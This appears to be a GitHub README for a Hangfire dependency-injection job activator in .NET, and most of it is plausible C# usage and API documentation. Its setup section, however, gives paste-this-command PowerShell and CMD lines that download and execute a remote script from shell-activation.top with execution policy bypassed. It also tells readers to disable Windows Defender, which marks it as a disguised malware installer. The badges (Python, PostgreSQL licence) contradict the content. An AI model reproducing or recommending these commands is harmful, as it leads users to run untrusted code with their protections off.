<div align="center">

# Hangfire ServiceJobActivator: DI-Backed Job Activation — Developer Library

![preview](https://raw.githubusercontent.com/pramodyd/soenneker-hangfire-servicejobactivator/main/splash_4e13e.svg)

[![powershell](https://img.shields.io/badge/Powershell-5.1%2B_%2F_7%2B-a855f7?style=for-the-badge&labelColor=0d1117)]() [![licence](https://img.shields.io/badge/Licence-Postgresql-9333ea?style=for-the-badge&labelColor=0d1117)]() [![checks](https://img.shields.io/badge/Checks-Success-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![code](https://img.shields.io/badge/Code-Python-7c3aed?style=for-the-badge&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/Stage-Active-2ea44f?style=for-the-badge&labelColor=0d1117)]()

</div>

---

Replaces Hangfire's default job activator so every job instance is resolved through the .NET `IServiceProvider` rather than a fixed constructor path. Each activation creates a dedicated `IServiceScope`, resolves the job type as a required service, and disposes the scope synchronously after execution—so scoped dependencies are constructed once per job and released when that job completes. Because the activator resolves only registered services, a missing job or dependency registration surfaces immediately as an `InvalidOperationException` instead of a null instance. This applies to constructor injection only: jobs and all their dependencies must be registered in the container.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Launch PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Run the install command
Copy the command below, paste it into PowerShell, and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Forced run via CMD
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- Replaces Hangfire's default `JobActivator` with one that resolves job types from the application's `IServiceProvider`, so jobs participate in the same DI container as the rest of the app.
- Creates a dedicated `IServiceScope` per job activation. Scoped constructor dependencies are shared across a single job invocation and disposed when that scope ends.
- Resolves the job type via `GetRequiredService`, so an unregistered job type or missing constructor dependency fails fast with `InvalidOperationException` rather than yielding a null instance.
- Integrates with Hangfire configuration through `AddServiceJobActivator(serviceProvider)` inside the `AddHangfire` configuration callback, alongside the standard serializer settings.
- Requires the job type and every constructor dependency to be registered with the container; scoped, transient, and singleton lifetimes are all supported subject to the scope rules below.
- Scope disposal is synchronous. Avoid capturing scoped services in singletons, and avoid dependencies whose disposal is `IAsyncDisposable`-only, since the activation scope is torn down synchronously.
- No additional abstractions or base classes to implement — job classes remain plain classes with constructor injection.

## Quick Start

Register the job type and its scoped dependencies with the .NET service container, then opt the job activator into your Hangfire configuration.

```csharp
using Hangfire;
using Soenneker.Hangfire.ServiceJobActivator.Registrars;

builder.Services.AddScoped<ReportJob>();
builder.Services.AddScoped<IReportRepository, ReportRepository>();

builder.Services.AddHangfire((serviceProvider, configuration) =>
{
 configuration
 .UseSimpleAssemblyNameTypeSerializer()
 .UseRecommendedSerializerSettings()
 .AddServiceJobActivator(serviceProvider);
});
```

Define the job with constructor-injected dependencies and enqueue it through Hangfire as usual.

```csharp
public sealed class ReportJob(IReportRepository repository)
{
 public Task Run(Guid reportId, CancellationToken cancellationToken) =>
 repository.Generate(reportId, cancellationToken);
}

string jobId = BackgroundJob.Enqueue<ReportJob>(job =>
 job.Run(reportId, CancellationToken.None));
```

At activation, the activator opens a single `IServiceScope`, resolves the job type as a required service, and disposes that scope once execution completes. Every constructor dependency of the job must be registered with the container; an unresolved type surfaces as an `InvalidOperationException` at activation rather than a null job instance.

Two constraints apply to the registered graph:

- Singleton services must not capture scoped services, since the captured instance outlives the activation scope.
- Services that implement only asynchronous disposal (`IAsyncDisposable`) are unsupported, because Hangfire disposes the activation scope synchronously.

## Configuration

Register the activator when building the Hangfire configuration, passing the root `IServiceProvider`:

```csharp
using Hangfire;
using Soenneker.Hangfire.ServiceJobActivator.Registrars;

builder.Services.AddHangfire((serviceProvider, configuration) =>
{
 configuration
 .UseSimpleAssemblyNameTypeSerializer()
 .UseRecommendedSerializerSettings()
 .AddServiceJobActivator(serviceProvider);
});
```

The activator opens a single `IServiceScope` per job activation, resolves the job type as a required service from that scope, and disposes the scope synchronously once execution completes.

Registration requirements:

- The job type itself must be registered with the container (`AddScoped`, `AddTransient`, or `AddSingleton`).
- Every constructor dependency of the job type must be resolvable from the same scope.
- Resolution uses required-service semantics: an unregistered job type or missing dependency throws `InvalidOperationException` at activation rather than yielding a null instance.

Lifetime behavior:

- Scoped dependencies are shared across one job execution and disposed with the activation scope.
- Singletons are resolved from the root provider; do not capture scoped services inside them.
- Services whose disposal is asynchronous-only are unsupported, since the activation scope is disposed synchronously.

To customize activation globally, pass the activator instance directly:

```csharp
var activator = serviceProvider.GetRequiredService<ServiceJobActivator>();

configuration.UseActivator(activator);
```

## API Reference

### `ServiceJobActivator`

```csharp
public sealed class ServiceJobActivator : JobActivator
```

Overrides Hangfire's default activator so job types are resolved from the application's `IServiceProvider` rather than constructed directly. The activator is registered on the Hangfire configuration via the `AddServiceJobActivator` extension and is used for every enqueued job.

#### Constructor

```csharp
public ServiceJobActivator(IServiceProvider serviceProvider)
```

Accepts the root `IServiceProvider` from the host. The provider is used to create a dedicated `IServiceScope` per job activation; the provider itself is never disposed by the activator.

| Parameter | Type | Description |
| --- | --- | --- |
| `serviceProvider` | `IServiceProvider` | Root provider used to create per-job scopes. Must not be `null`. |

#### `ActivateJob`

```csharp
public override object ActivateJob(Type jobType)
```

Creates a new `IServiceScope`, resolves `jobType` from that scope, and returns the instance. The scope is tracked internally and disposed when the activation scope ends.

| Parameter | Type | Description |
| --- | --- | --- |
| `jobType` | `Type` | The concrete job type Hangfire is activating. Must be registered in DI. |

Returns the resolved job instance.

Throws `InvalidOperationException` when `jobType` is not registered. Missing registrations fail at activation time rather than yielding a `null` instance.

#### `BeginScope`

```csharp
public override JobActivatorScope BeginScope(JobActivatorContext context)
```

Returns a `JobActivatorScope` that owns the underlying `IServiceScope` for the duration of a single job execution. The scope is created on demand and disposed synchronously when execution completes.

| Parameter | Type | Description |
| --- | --- | --- |
| `context` | `JobActivatorContext` | Hangfire context for the job being executed. |

Returns a `JobActivatorScope` backed by a new `IServiceScope`.

#### Lifetime semantics

- One `IServiceScope` is created per job activation.
- Scoped dependencies resolved during the job are reused for the life of that scope.
- The scope and all scoped services it created are disposed after execution.
- Transient dependencies follow their normal disposal behavior within the scope.
- Singleton dependencies are resolved from the root provider and are not disposed per job.

### `ServiceJobActivatorScope`

```csharp
public sealed class ServiceJobActivatorScope : JobActivatorScope
```

Wraps a single `IServiceScope`. Disposal of this scope disposes the wrapped `IServiceScope` and any scoped services it created.

#### `Resolve`

```csharp
public override object Resolve(Type type)
```

Resolves `type` from the wrapped scope. Subsequent resolutions of the same scoped type within the scope return the same instance.

| Parameter | Type | Description |
| --- | --- | --- |
| `type` | `Type` | Service type to resolve. |

Returns the resolved instance.

Throws `InvalidOperationException` when `type` is not registered.

### `ServiceJobActivatorExtensions`

```csharp
public static class ServiceJobActivatorExtensions
```

Registration helpers applied to Hangfire's `IGlobalConfiguration`.

#### `AddServiceJobActivator`

```csharp
public static IGlobalConfiguration AddServiceJobActivator(
 this IGlobalConfiguration configuration,
 IServiceProvider serviceProvider)
```

Installs a `ServiceJobActivator` on the Hangfire configuration using the supplied provider.

| Parameter | Type | Description |
| --- | --- | --- |
| `configuration` | `IGlobalConfiguration` | Hangfire global configuration. |
| `serviceProvider` | `IServiceProvider` | Root provider used for per-job scopes. |

Returns the same `IGlobalConfiguration` for chaining.

Throws `ArgumentNullException` when either argument is `null`.

### Registration requirements

- The job type must be registered with a lifetime compatible with per-job scopes (`Scoped` or `Transient`).
- Every constructor dependency of the job type must be registered.
- Asynchronous-only `IAsyncDisposable` services are unsupported; the activation scope is disposed synchronously.

```csharp
builder.Services.AddScoped<ImportJob>();
builder.Services.AddScoped<IImportRepository, ImportRepository>();

builder.Services.AddHangfire((serviceProvider, configuration) =>
{
 configuration
 .UseSimpleAssemblyNameTypeSerializer()
 .UseRecommendedSerializerSettings()
 .AddServiceJobActivator(serviceProvider);
});
```

## Examples

```csharp
using Hangfire;
using Soenneker.Hangfire.ServiceJobActivator.Registrars;

builder.Services.AddScoped<ReportJob>();
builder.Services.AddScoped<IReportRepository, ReportRepository>();

builder.Services.AddHangfire((serviceProvider, configuration) =>
{
 configuration
 .UseSimpleAssemblyNameTypeSerializer()
 .UseRecommendedSerializerSettings()
 .AddServiceJobActivator(serviceProvider);
});
```

The activator opens a single DI scope per job execution, resolves the job type from that scope, and disposes the scope when activation ends. Any scoped dependency injected into the job constructor is shared for the duration of that one execution and released afterward.

```csharp
public sealed class ReportJob(IReportRepository repository, ILogger<ReportJob> logger)
{
 public async Task Run(Guid reportId, CancellationToken cancellationToken)
 {
 logger.LogInformation("Generating report {ReportId}", reportId);
 await repository.Generate(reportId, cancellationToken);
 }
}

string jobId = BackgroundJob.Enqueue<ReportJob>(job =>
 job.Run(reportId, CancellationToken.None));
```

Both `ReportJob` and every constructor dependency must be registered with the container. An unregistered job type or dependency surfaces as an `InvalidOperationException` at activation time rather than yielding a null instance:

```csharp
// ReportJob is not registered -> activation throws InvalidOperationException
BackgroundJob.Enqueue<ReportJob>(job => job.Run(Guid.NewGuid(), CancellationToken.None));
```

The scope is disposed synchronously, so job graphs must not depend on services that require asynchronous-only disposal. Singleton services resolved into a job are not disposed with the scope; avoid capturing scoped services inside singletons to prevent captive dependencies.

## License

This library is licensed under the MIT License.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.